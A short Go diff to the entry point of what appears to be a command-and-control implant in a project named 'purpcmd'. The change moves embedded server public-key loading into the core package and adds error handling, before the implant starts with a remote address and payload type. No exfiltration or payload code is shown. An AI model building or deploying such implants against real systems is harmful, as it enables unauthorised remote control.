@@ -2,7 +2,6 @@ package main
 
 import (
 	"purpcmd/implant/core"
-	"purpcmd/internal/encrypt"
 )
 
 // Public key DER bytes - replaced during build
@@ -17,7 +16,9 @@ func main() {
 
 	// Load the embedded server public key
 	if len(publicKeyDER) > 0 {
-		encrypt.SetGlobalPublicKeyDER(publicKeyDER)
+		if err := core.SetPublicKeyDER(publicKeyDER); err != nil {
+			panic(err)
+		}
 	}
 
 	core.Start(remoteAdd, payloadType)
